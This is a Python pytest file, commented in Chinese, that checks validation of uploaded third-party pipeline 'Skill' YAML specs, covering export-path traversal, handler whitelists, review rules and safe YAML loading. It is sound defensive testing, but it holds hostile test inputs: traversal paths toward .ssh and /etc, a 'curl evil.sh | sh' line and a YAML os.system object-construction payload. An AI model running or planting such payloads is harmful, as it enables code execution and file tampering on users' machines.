"""外部 Skill 的约束。

Skill 比 Agent 的攻击面更大：它除了花 Credits、读项目数据之外，
还会**往用户指定的本地目录写文件**。这组用例是"可以上传别人的 Skill"
这个能力的安全前提。
"""

from __future__ import annotations

import pathlib
import textwrap
from typing import Any

import pytest
import yaml
from pydantic import ValidationError

from agents.spec import ROLES, AgentSpec
from skills import registry
from skills.spec import SkillSpec

BASE: dict[str, Any] = {
    "id": "skill.third_party.v1",
    "name": "第三方生产线",
    "route": "NOVEL_TO_ANIME",
    "stages": [
        {"id": "write", "name": "写", "kind": "agent", "role": "story"},
        {"id": "gate_final", "name": "成片确认", "kind": "gate", "gate": "final", "required": True},
    ],
}


def _spec(**over: Any) -> dict[str, Any]:
    return {**BASE, **over}


def _with_stage(stage: dict[str, Any]) -> dict[str, Any]:
    return _spec(stages=[stage, *BASE["stages"]])


def _write(directory: pathlib.Path, name: str, spec: dict[str, Any]) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    (directory / f"{name}.yaml").write_text(
        yaml.safe_dump(spec, allow_unicode=True), encoding="utf-8"
    )


# ------------------------------------------------------------ 本地磁盘写入


@pytest.mark.parametrize(
    "evil",
    [
        "../../.ssh",
        "..",
        "a/../../b",
        "/etc/cron.d",
        "C:/Windows/System32",
        r"a\b",
        "a/b/c/d",  # 超过深度上限
    ],
)
def test_export_path_cannot_escape(evil: str) -> None:
    """导出路径不能穿越出项目目录。

    这些路径会被拼到用户指定的本地目录下并真的写文件。
    一个 `../../.ssh` 就是往用户主目录写东西。
    """
    with pytest.raises(ValidationError):
        SkillSpec.model_validate(
            _with_stage({"id": "s", "name": "s", "kind": "agent", "role": "story", "export": evil})
        )


def test_export_path_allows_readable_names() -> None:
    """用户要自己打开这个文件夹看，目录名得是人能读的。"""
    spec = SkillSpec.model_validate(
        _with_stage(
            {
                "id": "s",
                "name": "s",
                "kind": "agent",
                "role": "story",
                "export": "03_assets/角色",
            }
        )
    )
    assert spec.stage("s").export == "03_assets/角色"


# ------------------------------------------------------------ 处理器白名单


def test_unknown_handler_is_rejected() -> None:
    """spec 不能凭空声明一个确定性处理器。

    和 Agent 的工具白名单同理：允许 spec 自造处理器名，
    等于允许它描述一个平台没审查过的能力。
    """
    with pytest.raises(ValidationError, match="未注册的处理器"):
        SkillSpec.model_validate(
            _with_stage({"id": "s", "name": "s", "kind": "compute", "handler": "os.system"})
        )


def test_unknown_gate_is_rejected() -> None:
    with pytest.raises(ValidationError, match="未知的门"):
        SkillSpec.model_validate(
            _with_stage({"id": "s", "name": "s", "kind": "gate", "gate": "whatever"})
        )


def test_unknown_role_is_rejected() -> None:
    with pytest.raises(ValidationError, match="未知 role"):
        SkillSpec.model_validate(
            _with_stage({"id": "s", "name": "s", "kind": "agent", "role": "hacker"})
        )


def test_unknown_field_is_rejected() -> None:
    with pytest.raises(ValidationError):
        SkillSpec.model_validate(_spec(run_shell="curl evil.sh | sh"))


# ------------------------------------------------------------ 阶段字段串味


def test_stage_fields_must_match_kind() -> None:
    """写错 kind 时要立刻报错，不能静默忽略半份配置。

    静默忽略会让人以为配置生效了，实际上没有——这类问题极难排查。
    """
    with pytest.raises(ValidationError, match="不该声明"):
        SkillSpec.model_validate(
            _with_stage(
                {
                    "id": "s",
                    "name": "s",
                    "kind": "compute",
                    "handler": "timeline.render",
                    "role": "story",
                }
            )
        )


def test_generate_stage_must_declare_review() -> None:
    with pytest.raises(ValidationError, match="必须声明 review"):
        SkillSpec.model_validate(
            _with_stage(
                {"id": "s", "name": "s", "kind": "generate", "capability": "image_generation"}
            )
        )


def test_only_agent_stage_can_be_revised_by_chat() -> None:
    """确定性阶段没有可修订的东西，生成阶段的返工走 review。"""
    with pytest.raises(ValidationError, match="聊天修订"):
        SkillSpec.model_validate(
            _with_stage(
                {
                    "id": "s",
                    "name": "s",
                    "kind": "compute",
                    "handler": "timeline.render",
                    "revisable": True,
                }
            )
        )


# ------------------------------------------------------------ 审查策略


def test_auto_review_needs_a_judge() -> None:
    """允许全自动就必须说清楚"谁来判不合格"。

    没有判据的全自动等于"生成了就算过"，那不是自动化，是没有审查。
    """
    with pytest.raises(ValidationError, match="metric"):
        SkillSpec.model_validate(
            _with_stage(
                {
                    "id": "s",
                    "name": "s",
                    "kind": "generate",
                    "capability": "image_generation",
                    "review": {"allow_auto": True},
                }
            )
        )


def test_threshold_is_a_key_not_a_number() -> None:
    """阈值只能写键名，数值进库。

    相似度阈值还在标定中，写死在发布物里等于把待定的数字冻起来。
    """
    with pytest.raises(ValidationError):
        SkillSpec.model_validate(
            _with_stage(
                {
                    "id": "s",
                    "name": "s",
                    "kind": "generate",
                    "capability": "image_generation",
                    "review": {
                        "allow_auto": True,
                        "metric": "character_similarity",
                        "threshold_key": 0.78,
                    },
                }
            )
        )


def test_retry_attempts_have_a_ceiling() -> None:
    """一张图无限重试就是无限烧钱。"""
    with pytest.raises(ValidationError):
        SkillSpec.model_validate(
            _with_stage(
                {
                    "id": "s",
                    "name": "s",
                    "kind": "generate",
                    "capability": "image_generation",
                    "review": {
                        "allow_auto": True,
                        "metric": "character_similarity",
                        "threshold_key": "consistency.character_similarity",
                        "max_attempts": 999,
                    },
                }
            )
        )


# ------------------------------------------------------------ 生产线结构


def test_at_least_one_required_gate() -> None:
    """一条任何一步都不给人看的生产线，用户只能在成片阶段发现问题，
    那时候钱已经花完了。"""
    with pytest.raises(ValidationError, match="required 的门"):
        SkillSpec.model_validate(
            _spec(stages=[{"id": "w", "name": "写", "kind": "agent", "role": "story"}])
        )


def test_duplicate_stage_id_is_rejected() -> None:
    with pytest.raises(ValidationError, match="阶段 id 重复"):
        SkillSpec.model_validate(
            _spec(
                stages=[
                    {"id": "w", "name": "写", "kind": "agent", "role": "story"},
                    {"id": "w", "name": "又写", "kind": "agent", "role": "visual"},
                    BASE["stages"][1],
                ]
            )
        )


def test_duplicate_gate_is_rejected() -> None:
    with pytest.raises(ValidationError, match="声明了多次"):
        SkillSpec.model_validate(
            _spec(
                stages=[
                    {"id": "g1", "name": "门", "kind": "gate", "gate": "final", "required": True},
                    {"id": "g2", "name": "门", "kind": "gate", "gate": "final"},
                ]
            )
        )


def test_id_format_is_enforced() -> None:
    for bad in ("novel_to_anime.v1", "skill.Novel.v1", "skill.novel", "../../etc/passwd"):
        with pytest.raises(ValidationError):
            SkillSpec.model_validate(_spec(id=bad))


def test_auto_mode_collapses_optional_gates() -> None:
    """门的数量是策略，不是常量。

    全自动模式下只剩不可关闭的门；这就是"用户可以选自动"的准确含义。
    """
    spec = registry.load(custom_dir=pathlib.Path("/nonexistent")).specs["skill.novel_to_anime.v1"]
    assert spec.effective_gates(review_mode="auto") == ["script", "final"]
    assert set(spec.effective_gates()) == {"script", "assets", "anchor", "storyboard", "final"}


# ------------------------------------------------------------ 加载


def test_yaml_cannot_construct_python_objects(tmp_path: pathlib.Path) -> None:
    custom = tmp_path / "custom"
    custom.mkdir()
    (custom / "evil.yaml").write_text(
        textwrap.dedent("""
            id: skill.evil.v1
            name: evil
            route: NOVEL_TO_ANIME
            stages: !!python/object/apply:os.system ["echo pwned"]
        """),
        encoding="utf-8",
    )

    report = registry.load(builtin_dir=registry.BUILTIN_DIR, custom_dir=custom)
    assert "skill.evil.v1" not in report.specs
    assert "evil.yaml" in report.errors


def test_oversized_spec_is_rejected(tmp_path: pathlib.Path) -> None:
    custom = tmp_path / "custom"
    custom.mkdir()
    (custom / "huge.yaml").write_text("x" * (registry.MAX_SPEC_BYTES + 1), encoding="utf-8")

    report = registry.load(builtin_dir=registry.BUILTIN_DIR, custom_dir=custom)
    assert "huge.yaml" in report.errors


def test_one_bad_spec_does_not_break_the_rest(tmp_path: pathlib.Path) -> None:
    custom = tmp_path / "custom"
    _write(custom, "good", _spec(id="skill.good.v1"))
    (custom / "bad.yaml").write_text("id: [unclosed", encoding="utf-8")

    report = registry.load(builtin_dir=registry.BUILTIN_DIR, custom_dir=custom)
    assert "skill.good.v1" in report.specs
    assert "bad.yaml" in report.errors
    assert any(s.source == "builtin" for s in report.specs.values())


def test_duplicate_id_cannot_shadow_builtin(tmp_path: pathlib.Path) -> None:
    custom = tmp_path / "custom"
    _write(custom, "dup", _spec(id="skill.novel_to_anime.v1"))

    report = registry.load(builtin_dir=registry.BUILTIN_DIR, custom_dir=custom)
    assert "dup.yaml" in report.errors
    assert report.specs["skill.novel_to_anime.v1"].source == "builtin"


# ------------------------------------------------------------ 内置自检


def test_builtin_skills_are_valid() -> None:
    report = registry.load(custom_dir=pathlib.Path("/nonexistent"))
    assert not report.errors, f"内置 Skill 有问题：{report.errors}"
    assert "skill.novel_to_anime.v1" in report.specs


def test_builtin_skills_reference_existing_agents() -> None:
    """Skill 钉死的 Agent 必须真的存在。

    引用一个不存在的 Agent，错误只会在生产线跑到那一步时才暴露，
    而那时用户已经等了几分钟并且花了钱。
    """
    for spec in registry.load(custom_dir=pathlib.Path("/nonexistent")).specs.values():
        assert not registry.missing_agents(spec), (
            f"{spec.id} 引用了不存在的 Agent：{registry.missing_agents(spec)}"
        )


def test_builtin_skill_declares_no_prices() -> None:
    """价格、汇率、废片率一律不进发布物（ADR-014）。

    Skill 是会被打包分发的东西，任何数字冻在里面都要改文件才能改。
    """
    forbidden = ("price", "cost", "credit_per", "exchange_rate", "retry_factor", "废片率")
    for path in registry.BUILTIN_DIR.glob("*.yaml"):
        text = path.read_text(encoding="utf-8").lower()
        hits = [w for w in forbidden if w in text]
        assert not hits, f"{path.name} 里出现了定价相关字段：{hits}"


def test_audio_comes_before_visuals() -> None:
    """音频优先（ADR-011）。

    先出视频再配音必然音画错位：视频片段时长固定，台词时长不固定，
    事后拉伸变形、裁剪丢内容。这条顺序是靠测试守住的，不是靠记性。
    """
    spec = registry.load(custom_dir=pathlib.Path("/nonexistent")).specs["skill.novel_to_anime.v1"]
    order = [s.id for s in spec.stages]
    assert order.index("voice") < order.index("keyframes")
    assert order.index("voice") < order.index("durations"), "时长必须来自真实音频，不是估算"
    assert order.index("durations") < order.index("batches"), "先有时长才能切 15 秒批次"


def test_roles_constant_matches_agent_spec() -> None:
    """ROLES 与 AgentSpec.role 的 Literal 必须一致。

    Skill 层按 ROLES 校验阶段声明，两边漂了就会出现
    "Skill 校验通过但 Agent 加载不了"。
    """
    from typing import get_args

    assert set(ROLES) == set(get_args(AgentSpec.model_fields["role"].annotation))
